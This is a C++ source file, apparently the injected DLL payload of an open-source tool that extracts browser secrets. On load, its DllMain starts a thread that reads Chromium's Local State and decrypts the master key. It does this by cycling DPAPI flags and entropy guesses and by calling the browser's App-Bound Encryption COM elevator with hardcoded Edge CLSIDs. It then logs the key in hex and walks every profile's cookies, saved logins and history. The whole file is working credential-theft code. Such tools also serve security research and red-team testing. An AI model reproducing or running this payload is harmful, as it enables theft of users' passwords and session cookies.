// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../sys/bootstrap.hpp"
#include "../sys/internal_api.hpp"
#include "pipe_client.hpp"
#include "browser_config.hpp"
#include "data_extractor.hpp"
#include "fingerprint.hpp"
#include "../com/elevator.hpp"
#include <fstream>
#include <sstream>
#include <wincrypt.h>
#include <variant>

#pragma comment(lib, "crypt32.lib")

using namespace Payload;

struct ThreadParams {
    HMODULE hModule;
    LPVOID lpPipeName;
};

// Returns empty vector on failure, sets errorMsg if provided
std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState, const std::string& keyName, std::string* errorMsg = nullptr) {
    std::ifstream f(localState, std::ios::binary);
    if (!f) {
        if (errorMsg) *errorMsg = "Cannot open Local State";
        return {};
    }

    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

    // Find os_crypt section first to be precise
    size_t osCryptPos = content.find("\"os_crypt\":");
    if (osCryptPos == std::string::npos) osCryptPos = 0; // Fallback to start

    std::string tag = "\"" + keyName + "\":\"";
    size_t pos = content.find(tag, osCryptPos);
    if (pos == std::string::npos) {
        if (errorMsg) *errorMsg = "Key not found: " + keyName;
        return {};
    }

    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) {
        if (errorMsg) *errorMsg = "Malformed JSON";
        return {};
    }

    std::string b64 = content.substr(pos, end - pos);

    DWORD size = 0;
    if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr)) {
        if (errorMsg) *errorMsg = "Base64 pre-check failed";
        return {};
    }

    if (size < 5) {
        if (errorMsg) *errorMsg = "Invalid key data (too small)";
        return {};
    }

    std::vector<uint8_t> data(size);
    if (!CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr)) {
        if (errorMsg) *errorMsg = "Base64 decode failed";
        return {};
    }
    
    data.resize(size);
    return data;
}

std::string KeyToHex(const std::vector<uint8_t>& key) {
    std::string hex;
    for (auto b : key) {
        char buf[3];
        sprintf_s(buf, "%02X", b);
        hex += buf;
    }
    return hex;
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams*>(lpParam));
    LPCWSTR pipeName = static_cast<LPCWSTR>(params->lpPipeName);
    HMODULE hModule = params->hModule;

    {
        PipeClient pipe(pipeName);
        if (!pipe.IsValid()) {
            FreeLibraryAndExitThread(hModule, 0);
            return 1;
        }

        try {
            auto config = pipe.ReadConfig();
            auto browser = GetConfigs().at(config.browserType);
            if (!config.userDataPath.empty()) {
                browser.userDataPath = config.userDataPath;
            }

            if (browser.name == "DuckDuckGo" || browser.name == "WebView2") {
                if (browser.userDataPath.filename() != "EBWebView") {
                    if (std::filesystem::exists(browser.userDataPath / "EBWebView")) {
                        browser.userDataPath /= "EBWebView";
                    } else if (std::filesystem::exists(browser.userDataPath / "LocalState" / "EBWebView")) {
                        browser.userDataPath /= "LocalState\\EBWebView";
                    }
                }
            }

            pipe.Log("[-] Targeting UserData: " + browser.userDataPath.string());
            auto localStatePath = browser.userDataPath / "Local State";

            if (!Sys::InitApi(config.verbose)) {
                pipe.LogDebug("Warning: Syscall initialization failed.");
            }

            std::vector<uint8_t> masterKey;

            if (config.isGecko) {
                DataExtractor extractor(pipe, masterKey, config.outputPath, true);
                // Gecko logic...
            } else {
                // Chromium
                std::string error;
                auto encKey = GetEncryptedKeyByName(localStatePath, "app_bound_encrypted_key", &error);
                bool tryDpapiFirst = (browser.name == "DuckDuckGo" || browser.name == "WebView2");

                auto tryDpapi = [&]() {
                    auto legacyKey = GetEncryptedKeyByName(localStatePath, "encrypted_key");
                    if (!legacyKey.empty()) {
                        DATA_BLOB input, output;
                        size_t offset = 0;
                        if (legacyKey.size() > 5 && memcmp(legacyKey.data(), "DPAPI", 5) == 0) offset = 5;

                        input.pbData = const_cast<BYTE*>(legacyKey.data() + offset);
                        input.cbData = static_cast<DWORD>(legacyKey.size() - offset);

                        if (browser.name == "DuckDuckGo") {
                            std::string hex;
                            for (size_t i = 0; i < (input.cbData > 16 ? 16 : input.cbData); ++i) {
                                char buf[3];
                                sprintf_s(buf, sizeof(buf), "%02X", input.pbData[i]);
                                hex += buf;
                            }
                            pipe.Log("[-] DDG Key (size: " + std::to_string(input.cbData) + ") Hex: " + hex);
                        }

                        std::vector<DWORD> flagsToTry = { 0, 0x40, 0x1, 0x4, 0x44 };
                        RevertToSelf();

                        std::vector<std::variant<std::string, std::wstring>> entropies = { 
                            L"", L"DuckDuckGo", L"Microsoft Edge",
                            browser.userDataPath.wstring(),
                            browser.userDataPath.parent_path().wstring(),
                            L"DuckDuckGo.DesktopBrowser_ya2fgkz3nks94" 
                        };

                        for (auto flag : flagsToTry) {
                            for (const auto& entVar : entropies) {
                                DATA_BLOB entropy = { 0 };
                                if (std::holds_alternative<std::wstring>(entVar)) {
                                    auto ws = std::get<std::wstring>(entVar);
                                    if (!ws.empty()) {
                                        entropy.pbData = (BYTE*)ws.c_str();
                                        entropy.cbData = (DWORD)(ws.size() * sizeof(wchar_t));
                                    }
                                } else {
                                    auto s = std::get<std::string>(entVar);
                                    if (!s.empty()) {
                                        entropy.pbData = (BYTE*)s.c_str();
                                        entropy.cbData = (DWORD)s.size();
                                    }
                                }
                                if (CryptUnprotectData(&input, nullptr, (entropy.pbData ? &entropy : nullptr), nullptr, nullptr, flag, &output)) {
                                    masterKey.assign(output.pbData, output.pbData + output.cbData);
                                    LocalFree(output.pbData);
                                    pipe.Log("KEY:DPAPI:" + KeyToHex(masterKey));
                                    return true;
                                }
                            }
                        }
                    }
                    return false;
                };

                if (tryDpapiFirst) tryDpapi();

                if (masterKey.empty() && !encKey.empty()) {
                    pipe.Log("[-] Attempting ABE decryption (timeout 5s)...");
                    struct AbeParams {
                        std::vector<uint8_t> encKeyRaw;
                        BrowserConfig browser;
                        std::vector<uint8_t> result;
                        bool done = false;
                    } abeParams;

                    if (encKey.size() > 4 && memcmp(encKey.data(), "APPB", 4) == 0) {
                        abeParams.encKeyRaw.assign(encKey.begin() + 4, encKey.end());
                    } else {
                        abeParams.encKeyRaw = encKey;
                    }
                    abeParams.browser = browser;

                    HANDLE hAbeThread = CreateThread(NULL, 0, [](LPVOID lp) -> DWORD {
                        auto p = static_cast<AbeParams*>(lp);
                        try {
                            Com::Elevator elevator;
                            if (p->browser.name == "Edge") {
                                std::vector<GUID> edgeClsids = {
                                    p->browser.clsid,
                                    {0xD09425E4, 0xA1FD, 0x4CCB, {0x97, 0x21, 0x39, 0xF2, 0x80, 0xA2, 0x87, 0x51}},
                                    {0x05307513, 0xDF72, 0x4B44, {0x88, 0x49, 0x06, 0x6E, 0x0A, 0x89, 0xAF, 0xBA}},
                                    {0xAC49480F, 0xA186, 0x4447, {0xB9, 0xC0, 0x8B, 0x35, 0xA0, 0x09, 0x18, 0x0D}}
                                };
                                for (const auto& clsid : edgeClsids) {
                                    try {
                                        p->result = elevator.DecryptKey(p->encKeyRaw, clsid, p->browser.iid, p->browser.iid_v2, true, false);
                                        if (!p->result.empty()) break;
                                    } catch (...) {}
                                }
                            } else {
                                p->result = elevator.DecryptKey(p->encKeyRaw, p->browser.clsid, p->browser.iid, p->browser.iid_v2, false, p->browser.name == "Avast");
                            }
                        } catch (...) {}
                        p->done = true;
                        return 0;
                    }, &abeParams, 0, NULL);

                    if (hAbeThread) {
                        WaitForSingleObject(hAbeThread, 5000);
                        CloseHandle(hAbeThread);
                    }

                    if (!abeParams.result.empty()) {
                        masterKey = abeParams.result;
                        pipe.Log("KEY:ABE:" + KeyToHex(masterKey));
                    }
                }

                if (masterKey.empty() && !tryDpapiFirst) tryDpapi();

                if (browser.name == "Edge" && !masterKey.empty()) {
                    auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
                    if (!asterEncKey.empty()) {
                        try {
                            Com::Elevator elevator;
                            auto asterKey = elevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
                            pipe.Log("ASTER_KEY:" + KeyToHex(asterKey));
                        } catch (...) {}
                    }
                }

                DataExtractor extractor(pipe, masterKey, config.outputPath, false);
                pipe.Log("[-] Effective UserData: " + browser.userDataPath.string());

                if (std::filesystem::exists(browser.userDataPath)) {
                    for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
                        try {
                            if (entry.is_directory()) {
                                bool hasHistory = std::filesystem::exists(entry.path() / "History");
                                bool hasEncrypted = std::filesystem::exists(entry.path() / "Network" / "Cookies") || 
                                                    std::filesystem::exists(entry.path() / "Cookies") ||
                                                    std::filesystem::exists(entry.path() / "Login Data");

                                if (hasHistory || hasEncrypted) {
                                    pipe.Log("[-] Found profile: " + entry.path().filename().string());
                                    extractor.ProcessUnencrypted(entry.path(), browser.name);
                                    if (!masterKey.empty() && hasEncrypted) {
                                        extractor.ProcessProfile(entry.path(), browser.name);
                                    }
                                }
                            }
                        } catch (...) {}
                    }
                }
            } // End Chromium

            if (config.fingerprint) {
                FingerprintExtractor fingerprinter(pipe, browser, config.outputPath);
                fingerprinter.Extract();
            }

        } catch (const std::exception& e) {
            pipe.Log("[-] " + std::string(e.what()));
        }
    }

    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        auto params = new ThreadParams{hModule, lpReserved};
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, params, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
